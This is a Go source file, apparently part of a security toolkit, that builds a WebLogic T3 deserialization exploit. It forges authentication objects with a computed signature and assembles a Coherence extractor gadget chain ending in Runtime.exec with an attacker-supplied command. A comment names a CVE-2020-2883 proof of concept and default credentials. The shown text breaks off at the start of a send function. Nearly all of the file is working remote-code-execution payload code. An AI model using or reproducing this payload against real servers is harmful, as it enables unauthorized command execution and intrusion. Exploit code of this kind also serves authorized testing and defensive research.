package t3

import (
	"bufio"
	"bytes"
	"crypto/md5"
	"encoding/binary"
	"fmt"
	"net"
	"text/template"
	"time"
	"yaklang/common/yak/yaklib/codec"
	"yaklang/common/yserx"
)

func aa() ([]byte, []byte) {

	//payload := []byte("\x00")

	//authenticatedUser := []byte("\x00")
	srcJVMIDTmpl := `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.rjvm.JVMID",
        "serial_version": "3EnCPt4SHio=",
        "handle": 8257536,
        "desc_flag": 12,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 0,
          "fields": null
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 28,
            "contents": "AQAAAAAAAAABAAkxMjcuMC4wLjGDtXlSAAAAAA=="
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257537
  }
]`
	serilizable, _ := yserx.FromJson([]byte(srcJVMIDTmpl))
	srcJVMID := yserx.MarshalJavaObjects(serilizable...)
	dstJVMIDTmpl := `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.rjvm.JVMID",
        "serial_version": "3EnCPt4SHio=",
        "handle": 8257536,
        "desc_flag": 12,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 0,
          "fields": null
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 17,
            "contents": "AAAAAAAAAAABAAAAAAAAAAA="
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257537
  }
]`
	serilizable, _ = yserx.FromJson([]byte(dstJVMIDTmpl))
	dstJVMID := yserx.MarshalJavaObjects(serilizable...)
	return srcJVMID, dstJVMID
}
func genAuth(name string, password string) []byte {
	bytebuf := bytes.NewBuffer([]byte{})
	binary.Write(bytebuf, binary.BigEndian, time.Now().UnixNano()/1e6)
	timeStampRaw := bytebuf.Bytes()
	timeStamp := codec.EncodeBase64(timeStampRaw)

	var4 := make([]byte, 65)
	var5 := make([]byte, 65)
	copy(var4, name)
	copy(var5, password)
	for i := 0; i < 64; i++ {
		var4[i] = (byte)(var4[i] ^ 54)
		var5[i] = (byte)(var5[i] ^ 92)
	}

	//fmt.Println(codec.EncodeBase64(codec.Md5([]byte("123123123"))))
	var3 := md5.New()
	var3.Write(var4)
	var3.Write(timeStampRaw)
	var3.Write([]byte(name))
	var7 := var3.Sum(nil)
	var3.Reset()
	var3.Write(var5)
	var3.Write(var7)
	sign := var3.Sum(nil)
	signature := codec.EncodeBase64(sign)

	authenticatedUserTmpl := `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.security.acl.internal.AuthenticatedUser",
        "serial_version": "XPjpaE9z63s=",
        "handle": 8257536,
        "desc_flag": 2,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 7,
          "fields": [
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "localPort",
              "field_type": 73,
              "field_type_verbose": "int",
              "class_name_1": null
            },
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "qos",
              "field_type": 66,
              "field_type_verbose": "byte",
              "class_name_1": null
            },
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "timeStamp",
              "field_type": 74,
              "field_type_verbose": "long",
              "class_name_1": null
            },
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "inetAddress",
              "field_type": 76,
              "field_type_verbose": "object",
              "class_name_1": {
                "type": 116,
                "type_verbose": "TC_STRING",
                "is_long": false,
                "size": 22,
                "raw": "TGphdmEvbmV0L0luZXRBZGRyZXNzOw==",
                "value": "Ljava/net/InetAddress;",
                "handle": 0
              }
            },
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "localAddress",
              "field_type": 76,
              "field_type_verbose": "object",
              "class_name_1": {
                "type": 113,
                "type_verbose": "TC_REFERENCE",
                "value": "AH4AAQ==",
                "handle": 8257537
              }
            },
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "name",
              "field_type": 76,
              "field_type_verbose": "object",
              "class_name_1": {
                "type": 116,
                "type_verbose": "TC_STRING",
                "is_long": false,
                "size": 18,
                "raw": "TGphdmEvbGFuZy9TdHJpbmc7",
                "value": "Ljava/lang/String;",
                "handle": 0
              }
            },
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "signature",
              "field_type": 91,
              "field_type_verbose": "array",
              "class_name_1": {
                "type": 116,
                "type_verbose": "TC_STRING",
                "is_long": false,
                "size": 2,
                "raw": "W0I=",
                "value": "[B",
                "handle": 0
              }
            }
          ]
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": [
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 73,
            "field_type_verbose": "int",
            "bytes": "/////w=="
          },
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 66,
            "field_type_verbose": "byte",
            "bytes": "ZQ=="
          },
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 74,
            "field_type_verbose": "long",
            "bytes": "{{ .timeStamp }}"
          },
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 76,
            "field_type_verbose": "object",
            "object": {
              "type": 112,
              "type_verbose": "TC_NULL"
            }
          },
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 76,
            "field_type_verbose": "object",
            "object": {
              "type": 112,
              "type_verbose": "TC_NULL"
            }
          },
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 76,
            "field_type_verbose": "object",
            "object": {
              "type": 116,
              "type_verbose": "TC_STRING",
              "is_long": false,
              "size": 8,
              "raw": "{{ .usernameBase }}",
              "value": "{{ .username }}",
              "handle": 0
            }
          },
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 91,
            "field_type_verbose": "array",
            "object": {
              "type": 117,
              "type_verbose": "TC_ARRAY",
              "class_desc": {
                "type": 0,
                "type_verbose": "X_CLASSDESC",
                "detail": {
                  "type": 114,
                  "type_verbose": "TC_CLASSDESC",
                  "is_null": false,
                  "class_name": "[B",
                  "serial_version": "rPMX+AYIVOA=",
                  "handle": 8257542,
                  "desc_flag": 2,
                  "fields": {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELDS",
                    "field_count": 0,
                    "fields": null
                  },
                  "annotations": null,
                  "super_class": {
                    "type": 112,
                    "type_verbose": "TC_NULL"
                  },
                  "dynamic_proxy_class": false,
                  "dynamic_proxy_class_interface_count": 0,
                  "dynamic_proxy_annotation": null,
                  "dynamic_proxy_class_interface_names": null
                }
              },
              "size": 16,
              "values": null,
              "handle": 8257543,
              "bytescode": true,
              "bytes": "{{ .signature }}"
            }
          }
        ],
        "block_data": null
      }
    ],
    "handle": 8257540
  }
]`
	tmp, _ := template.New("auth").Parse(authenticatedUserTmpl)
	var buf bytes.Buffer
	kv := map[string]interface{}{
		"username":     name,
		"usernameBase": codec.EncodeBase64(name),
		"signature":    signature,
		"timeStamp":    timeStamp,
	}
	tmp.Execute(&buf, kv)
	serilizable, _ := yserx.FromJson(buf.Bytes())
	authenticatedUser := yserx.MarshalJavaObjects(serilizable...)
	return authenticatedUser
}
func genPayload(cmd string) []byte {
	payloadTml := `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "java.util.PriorityQueue",
        "serial_version": "lNowtPs/grE=",
        "handle": 8257536,
        "desc_flag": 3,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 2,
          "fields": [
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "size",
              "field_type": 73,
              "field_type_verbose": "int",
              "class_name_1": null
            },
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "comparator",
              "field_type": 76,
              "field_type_verbose": "object",
              "class_name_1": {
                "type": 116,
                "type_verbose": "TC_STRING",
                "is_long": false,
                "size": 22,
                "raw": "TGphdmEvdXRpbC9Db21wYXJhdG9yOw==",
                "value": "Ljava/util/Comparator;",
                "handle": 0
              }
            }
          ]
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": [
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 73,
            "field_type_verbose": "int",
            "bytes": "AAAAAg=="
          },
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 76,
            "field_type_verbose": "object",
            "object": {
              "type": 115,
              "type_verbose": "TC_OBJECT",
              "class_desc": {
                "type": 0,
                "type_verbose": "X_CLASSDESC",
                "detail": {
                  "type": 114,
                  "type_verbose": "TC_CLASSDESC",
                  "is_null": false,
                  "class_name": "com.tangosol.util.comparator.ExtractorComparator",
                  "serial_version": "x61tOmdvPBg=",
                  "handle": 8257539,
                  "desc_flag": 2,
                  "fields": {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELDS",
                    "field_count": 1,
                    "fields": [
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "m_extractor",
                        "field_type": 76,
                        "field_type_verbose": "object",
                        "class_name_1": {
                          "type": 116,
                          "type_verbose": "TC_STRING",
                          "is_long": false,
                          "size": 34,
                          "raw": "TGNvbS90YW5nb3NvbC91dGlsL1ZhbHVlRXh0cmFjdG9yOw==",
                          "value": "Lcom/tangosol/util/ValueExtractor;",
                          "handle": 0
                        }
                      }
                    ]
                  },
                  "annotations": null,
                  "super_class": {
                    "type": 112,
                    "type_verbose": "TC_NULL"
                  },
                  "dynamic_proxy_class": false,
                  "dynamic_proxy_class_interface_count": 0,
                  "dynamic_proxy_annotation": null,
                  "dynamic_proxy_class_interface_names": null
                }
              },
              "class_data": [
                {
                  "type": 0,
                  "type_verbose": "X_CLASSDATA",
                  "fields": null,
                  "block_data": null
                },
                {
                  "type": 0,
                  "type_verbose": "X_CLASSDATA",
                  "fields": [
                    {
                      "type": 0,
                      "type_verbose": "X_FIELDVALUE",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "object": {
                        "type": 115,
                        "type_verbose": "TC_OBJECT",
                        "class_desc": {
                          "type": 0,
                          "type_verbose": "X_CLASSDESC",
                          "detail": {
                            "type": 114,
                            "type_verbose": "TC_CLASSDESC",
                            "is_null": false,
                            "class_name": "com.tangosol.util.extractor.ChainedExtractor",
                            "serial_version": "iJ+BsJRdW38=",
                            "handle": 8257542,
                            "desc_flag": 2,
                            "fields": {
                              "type": 0,
                              "type_verbose": "X_CLASSFIELDS",
                              "field_count": 0,
                              "fields": null
                            },
                            "annotations": null,
                            "super_class": {
                              "type": 0,
                              "type_verbose": "X_CLASSDESC",
                              "detail": {
                                "type": 114,
                                "type_verbose": "TC_CLASSDESC",
                                "is_null": false,
                                "class_name": "com.tangosol.util.extractor.AbstractCompositeExtractor",
                                "serial_version": "CGs9jAVpD0Q=",
                                "handle": 8257543,
                                "desc_flag": 2,
                                "fields": {
                                  "type": 0,
                                  "type_verbose": "X_CLASSFIELDS",
                                  "field_count": 1,
                                  "fields": [
                                    {
                                      "type": 0,
                                      "type_verbose": "X_CLASSFIELD",
                                      "name": "m_aExtractor",
                                      "field_type": 91,
                                      "field_type_verbose": "array",
                                      "class_name_1": {
                                        "type": 116,
                                        "type_verbose": "TC_STRING",
                                        "is_long": false,
                                        "size": 35,
                                        "raw": "W0xjb20vdGFuZ29zb2wvdXRpbC9WYWx1ZUV4dHJhY3Rvcjs=",
                                        "value": "[Lcom/tangosol/util/ValueExtractor;",
                                        "handle": 0
                                      }
                                    }
                                  ]
                                },
                                "annotations": null,
                                "super_class": {
                                  "type": 0,
                                  "type_verbose": "X_CLASSDESC",
                                  "detail": {
                                    "type": 114,
                                    "type_verbose": "TC_CLASSDESC",
                                    "is_null": false,
                                    "class_name": "com.tangosol.util.extractor.AbstractExtractor",
                                    "serial_version": "ZYGVMD5yOCE=",
                                    "handle": 8257545,
                                    "desc_flag": 2,
                                    "fields": {
                                      "type": 0,
                                      "type_verbose": "X_CLASSFIELDS",
                                      "field_count": 1,
                                      "fields": [
                                        {
                                          "type": 0,
                                          "type_verbose": "X_CLASSFIELD",
                                          "name": "m_nTarget",
                                          "field_type": 73,
                                          "field_type_verbose": "int",
                                          "class_name_1": null
                                        }
                                      ]
                                    },
                                    "annotations": null,
                                    "super_class": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    },
                                    "dynamic_proxy_class": false,
                                    "dynamic_proxy_class_interface_count": 0,
                                    "dynamic_proxy_annotation": null,
                                    "dynamic_proxy_class_interface_names": null
                                  }
                                },
                                "dynamic_proxy_class": false,
                                "dynamic_proxy_class_interface_count": 0,
                                "dynamic_proxy_annotation": null,
                                "dynamic_proxy_class_interface_names": null
                              }
                            },
                            "dynamic_proxy_class": false,
                            "dynamic_proxy_class_interface_count": 0,
                            "dynamic_proxy_annotation": null,
                            "dynamic_proxy_class_interface_names": null
                          }
                        },
                        "class_data": [
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": null,
                            "block_data": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": [
                              {
                                "type": 0,
                                "type_verbose": "X_FIELDVALUE",
                                "field_type": 73,
                                "field_type_verbose": "int",
                                "bytes": "AAAAAA=="
                              }
                            ],
                            "block_data": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": [
                              {
                                "type": 0,
                                "type_verbose": "X_FIELDVALUE",
                                "field_type": 91,
                                "field_type_verbose": "array",
                                "object": {
                                  "type": 117,
                                  "type_verbose": "TC_ARRAY",
                                  "class_desc": {
                                    "type": 0,
                                    "type_verbose": "X_CLASSDESC",
                                    "detail": {
                                      "type": 114,
                                      "type_verbose": "TC_CLASSDESC",
                                      "is_null": false,
                                      "class_name": "[Lcom.tangosol.util.ValueExtractor;",
                                      "serial_version": "IkYgRzXEoP4=",
                                      "handle": 8257547,
                                      "desc_flag": 2,
                                      "fields": {
                                        "type": 0,
                                        "type_verbose": "X_CLASSFIELDS",
                                        "field_count": 0,
                                        "fields": null
                                      },
                                      "annotations": null,
                                      "super_class": {
                                        "type": 112,
                                        "type_verbose": "TC_NULL"
                                      },
                                      "dynamic_proxy_class": false,
                                      "dynamic_proxy_class_interface_count": 0,
                                      "dynamic_proxy_annotation": null,
                                      "dynamic_proxy_class_interface_names": null
                                    }
                                  },
                                  "size": 3,
                                  "values": [
                                    {
                                      "type": 0,
                                      "type_verbose": "X_FIELDVALUE",
                                      "field_type": 76,
                                      "field_type_verbose": "object",
                                      "object": {
                                        "type": 115,
                                        "type_verbose": "TC_OBJECT",
                                        "class_desc": {
                                          "type": 0,
                                          "type_verbose": "X_CLASSDESC",
                                          "detail": {
                                            "type": 114,
                                            "type_verbose": "TC_CLASSDESC",
                                            "is_null": false,
                                            "class_name": "com.tangosol.util.extractor.ReflectionExtractor",
                                            "serial_version": "7nrplcAvtKI=",
                                            "handle": 8257549,
                                            "desc_flag": 2,
                                            "fields": {
                                              "type": 0,
                                              "type_verbose": "X_CLASSFIELDS",
                                              "field_count": 2,
                                              "fields": [
                                                {
                                                  "type": 0,
                                                  "type_verbose": "X_CLASSFIELD",
                                                  "name": "m_aoParam",
                                                  "field_type": 91,
                                                  "field_type_verbose": "array",
                                                  "class_name_1": {
                                                    "type": 116,
                                                    "type_verbose": "TC_STRING",
                                                    "is_long": false,
                                                    "size": 19,
                                                    "raw": "W0xqYXZhL2xhbmcvT2JqZWN0Ow==",
                                                    "value": "[Ljava/lang/Object;",
                                                    "handle": 0
                                                  }
                                                },
                                                {
                                                  "type": 0,
                                                  "type_verbose": "X_CLASSFIELD",
                                                  "name": "m_sMethod",
                                                  "field_type": 76,
                                                  "field_type_verbose": "object",
                                                  "class_name_1": {
                                                    "type": 116,
                                                    "type_verbose": "TC_STRING",
                                                    "is_long": false,
                                                    "size": 18,
                                                    "raw": "TGphdmEvbGFuZy9TdHJpbmc7",
                                                    "value": "Ljava/lang/String;",
                                                    "handle": 0
                                                  }
                                                }
                                              ]
                                            },
                                            "annotations": null,
                                            "super_class": {
                                              "type": 113,
                                              "type_verbose": "TC_REFERENCE",
                                              "value": "AH4ACQ==",
                                              "handle": 8257545
                                            },
                                            "dynamic_proxy_class": false,
                                            "dynamic_proxy_class_interface_count": 0,
                                            "dynamic_proxy_annotation": null,
                                            "dynamic_proxy_class_interface_names": null
                                          }
                                        },
                                        "class_data": [
                                          {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDATA",
                                            "fields": null,
                                            "block_data": null
                                          },
                                          {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDATA",
                                            "fields": [
                                              {
                                                "type": 0,
                                                "type_verbose": "X_FIELDVALUE",
                                                "field_type": 73,
                                                "field_type_verbose": "int",
                                                "bytes": "AAAAAA=="
                                              }
                                            ],
                                            "block_data": null
                                          },
                                          {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDATA",
                                            "fields": [
                                              {
                                                "type": 0,
                                                "type_verbose": "X_FIELDVALUE",
                                                "field_type": 91,
                                                "field_type_verbose": "array",
                                                "object": {
                                                  "type": 117,
                                                  "type_verbose": "TC_ARRAY",
                                                  "class_desc": {
                                                    "type": 0,
                                                    "type_verbose": "X_CLASSDESC",
                                                    "detail": {
                                                      "type": 114,
                                                      "type_verbose": "TC_CLASSDESC",
                                                      "is_null": false,
                                                      "class_name": "[Ljava.lang.Object;",
                                                      "serial_version": "kM5YnxBzKWw=",
                                                      "handle": 8257553,
                                                      "desc_flag": 2,
                                                      "fields": {
                                                        "type": 0,
                                                        "type_verbose": "X_CLASSFIELDS",
                                                        "field_count": 0,
                                                        "fields": null
                                                      },
                                                      "annotations": null,
                                                      "super_class": {
                                                        "type": 112,
                                                        "type_verbose": "TC_NULL"
                                                      },
                                                      "dynamic_proxy_class": false,
                                                      "dynamic_proxy_class_interface_count": 0,
                                                      "dynamic_proxy_annotation": null,
                                                      "dynamic_proxy_class_interface_names": null
                                                    }
                                                  },
                                                  "size": 2,
                                                  "values": [
                                                    {
                                                      "type": 0,
                                                      "type_verbose": "X_FIELDVALUE",
                                                      "field_type": 76,
                                                      "field_type_verbose": "object",
                                                      "object": {
                                                        "type": 116,
                                                        "type_verbose": "TC_STRING",
                                                        "is_long": false,
                                                        "size": 10,
                                                        "raw": "Z2V0UnVudGltZQ==",
                                                        "value": "getRuntime",
                                                        "handle": 0
                                                      }
                                                    },
                                                    {
                                                      "type": 0,
                                                      "type_verbose": "X_FIELDVALUE",
                                                      "field_type": 76,
                                                      "field_type_verbose": "object",
                                                      "object": {
                                                        "type": 117,
                                                        "type_verbose": "TC_ARRAY",
                                                        "class_desc": {
                                                          "type": 0,
                                                          "type_verbose": "X_CLASSDESC",
                                                          "detail": {
                                                            "type": 114,
                                                            "type_verbose": "TC_CLASSDESC",
                                                            "is_null": false,
                                                            "class_name": "[Ljava.lang.Class;",
                                                            "serial_version": "qxbXrsvNWpk=",
                                                            "handle": 8257556,
                                                            "desc_flag": 2,
                                                            "fields": {
                                                              "type": 0,
                                                              "type_verbose": "X_CLASSFIELDS",
                                                              "field_count": 0,
                                                              "fields": null
                                                            },
                                                            "annotations": null,
                                                            "super_class": {
                                                              "type": 112,
                                                              "type_verbose": "TC_NULL"
                                                            },
                                                            "dynamic_proxy_class": false,
                                                            "dynamic_proxy_class_interface_count": 0,
                                                            "dynamic_proxy_annotation": null,
                                                            "dynamic_proxy_class_interface_names": null
                                                          }
                                                        },
                                                        "size": 0,
                                                        "values": null,
                                                        "handle": 8257557
                                                      }
                                                    }
                                                  ],
                                                  "handle": 8257554
                                                }
                                              },
                                              {
                                                "type": 0,
                                                "type_verbose": "X_FIELDVALUE",
                                                "field_type": 76,
                                                "field_type_verbose": "object",
                                                "object": {
                                                  "type": 116,
                                                  "type_verbose": "TC_STRING",
                                                  "is_long": false,
                                                  "size": 9,
                                                  "raw": "Z2V0TWV0aG9k",
                                                  "value": "getMethod",
                                                  "handle": 0
                                                }
                                              }
                                            ],
                                            "block_data": null
                                          }
                                        ],
                                        "handle": 8257552
                                      }
                                    },
                                    {
                                      "type": 0,
                                      "type_verbose": "X_FIELDVALUE",
                                      "field_type": 76,
                                      "field_type_verbose": "object",
                                      "object": {
                                        "type": 115,
                                        "type_verbose": "TC_OBJECT",
                                        "class_desc": {
                                          "type": 113,
                                          "type_verbose": "TC_REFERENCE",
                                          "value": "AH4ADQ==",
                                          "handle": 8257549
                                        },
                                        "class_data": [
                                          {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDATA",
                                            "fields": null,
                                            "block_data": null
                                          },
                                          {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDATA",
                                            "fields": [
                                              {
                                                "type": 0,
                                                "type_verbose": "X_FIELDVALUE",
                                                "field_type": 73,
                                                "field_type_verbose": "int",
                                                "bytes": "AAAAAA=="
                                              }
                                            ],
                                            "block_data": null
                                          },
                                          {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDATA",
                                            "fields": [
                                              {
                                                "type": 0,
                                                "type_verbose": "X_FIELDVALUE",
                                                "field_type": 91,
                                                "field_type_verbose": "array",
                                                "object": {
                                                  "type": 117,
                                                  "type_verbose": "TC_ARRAY",
                                                  "class_desc": {
                                                    "type": 113,
                                                    "type_verbose": "TC_REFERENCE",
                                                    "value": "AH4AEQ==",
                                                    "handle": 8257553
                                                  },
                                                  "size": 2,
                                                  "values": [
                                                    {
                                                      "type": 0,
                                                      "type_verbose": "X_FIELDVALUE",
                                                      "field_type": 76,
                                                      "field_type_verbose": "object",
                                                      "object": {
                                                        "type": 112,
                                                        "type_verbose": "TC_NULL"
                                                      }
                                                    },
                                                    {
                                                      "type": 0,
                                                      "type_verbose": "X_FIELDVALUE",
                                                      "field_type": 76,
                                                      "field_type_verbose": "object",
                                                      "object": {
                                                        "type": 117,
                                                        "type_verbose": "TC_ARRAY",
                                                        "class_desc": {
                                                          "type": 113,
                                                          "type_verbose": "TC_REFERENCE",
                                                          "value": "AH4AEQ==",
                                                          "handle": 8257553
                                                        },
                                                        "size": 0,
                                                        "values": null,
                                                        "handle": 8257561
                                                      }
                                                    }
                                                  ],
                                                  "handle": 8257560
                                                }
                                              },
                                              {
                                                "type": 0,
                                                "type_verbose": "X_FIELDVALUE",
                                                "field_type": 76,
                                                "field_type_verbose": "object",
                                                "object": {
                                                  "type": 116,
                                                  "type_verbose": "TC_STRING",
                                                  "is_long": false,
                                                  "size": 6,
                                                  "raw": "aW52b2tl",
                                                  "value": "invoke",
                                                  "handle": 0
                                                }
                                              }
                                            ],
                                            "block_data": null
                                          }
                                        ],
                                        "handle": 8257559
                                      }
                                    },
                                    {
                                      "type": 0,
                                      "type_verbose": "X_FIELDVALUE",
                                      "field_type": 76,
                                      "field_type_verbose": "object",
                                      "object": {
                                        "type": 115,
                                        "type_verbose": "TC_OBJECT",
                                        "class_desc": {
                                          "type": 113,
                                          "type_verbose": "TC_REFERENCE",
                                          "value": "AH4ADQ==",
                                          "handle": 8257549
                                        },
                                        "class_data": [
                                          {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDATA",
                                            "fields": null,
                                            "block_data": null
                                          },
                                          {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDATA",
                                            "fields": [
                                              {
                                                "type": 0,
                                                "type_verbose": "X_FIELDVALUE",
                                                "field_type": 73,
                                                "field_type_verbose": "int",
                                                "bytes": "AAAAAA=="
                                              }
                                            ],
                                            "block_data": null
                                          },
                                          {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDATA",
                                            "fields": [
                                              {
                                                "type": 0,
                                                "type_verbose": "X_FIELDVALUE",
                                                "field_type": 91,
                                                "field_type_verbose": "array",
                                                "object": {
                                                  "type": 117,
                                                  "type_verbose": "TC_ARRAY",
                                                  "class_desc": {
                                                    "type": 113,
                                                    "type_verbose": "TC_REFERENCE",
                                                    "value": "AH4AEQ==",
                                                    "handle": 8257553
                                                  },
                                                  "size": 1,
                                                  "values": [
                                                    {
                                                      "type": 0,
                                                      "type_verbose": "X_FIELDVALUE",
                                                      "field_type": 76,
                                                      "field_type_verbose": "object",
                                                      "object": {
                                                        "type": 116,
                                                        "type_verbose": "TC_STRING",
                                                        "is_long": false,
                                                        "size": {{ .len }},
                                                        "raw": "{{ .commandBase }}",
                                                        "value": "{{ .command }}",
                                                        "handle": 0
                                                      }
                                                    }
                                                  ],
                                                  "handle": 8257564
                                                }
                                              },
                                              {
                                                "type": 0,
                                                "type_verbose": "X_FIELDVALUE",
                                                "field_type": 76,
                                                "field_type_verbose": "object",
                                                "object": {
                                                  "type": 116,
                                                  "type_verbose": "TC_STRING",
                                                  "is_long": false,
                                                  "size": 4,
                                                  "raw": "ZXhlYw==",
                                                  "value": "exec",
                                                  "handle": 0
                                                }
                                              }
                                            ],
                                            "block_data": null
                                          }
                                        ],
                                        "handle": 8257563
                                      }
                                    }
                                  ],
                                  "handle": 8257548
                                }
                              }
                            ],
                            "block_data": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": null,
                            "block_data": null
                          }
                        ],
                        "handle": 8257546
                      }
                    }
                  ],
                  "block_data": null
                }
              ],
              "handle": 8257541
            }
          }
        ],
        "block_data": [
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 4,
            "contents": "AAAAAw=="
          },
          {
            "type": 118,
            "type_verbose": "TC_CLASS",
            "class_desc": {
              "type": 0,
              "type_verbose": "X_CLASSDESC",
              "detail": {
                "type": 114,
                "type_verbose": "TC_CLASSDESC",
                "is_null": false,
                "class_name": "java.lang.Runtime",
                "serial_version": "AAAAAAAAAAA=",
                "handle": 8257567,
                "desc_flag": 0,
                "fields": {
                  "type": 0,
                  "type_verbose": "X_CLASSFIELDS",
                  "field_count": 0,
                  "fields": null
                },
                "annotations": null,
                "super_class": {
                  "type": 112,
                  "type_verbose": "TC_NULL"
                },
                "dynamic_proxy_class": false,
                "dynamic_proxy_class_interface_count": 0,
                "dynamic_proxy_annotation": null,
                "dynamic_proxy_class_interface_names": null
              }
            },
            "handle": 8257568
          },
          {
            "type": 116,
            "type_verbose": "TC_STRING",
            "is_long": false,
            "size": 1,
            "raw": "MQ==",
            "value": "1",
            "handle": 0
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257538
  }
]`
	tmpp, err := template.New("queue").Parse(payloadTml)
	if err != nil {
		return nil
	}
	cmdTmp := map[string]interface{}{
		"command":     cmd,
		"commandBase": codec.EncodeBase64(cmd),
		"len":         len(cmd),
	}
	var buf bytes.Buffer
	tmpp.Execute(&buf, cmdTmp)
	serilizable, _ := yserx.FromJson(buf.Bytes())
	payload := yserx.MarshalJavaObjects(serilizable...)
	return payload
}
func send(addr string) {
	//genAuth("t3", "welcome1")
	//ioutil.WriteFile("auth.ser", genAuth("t3", "welcome1"), 0666)
	//payload, _ := ioutil.ReadFile("/Users/z3/GitPJ/Weblogic_CVE-2020-2883_POC-master/payload.ser")
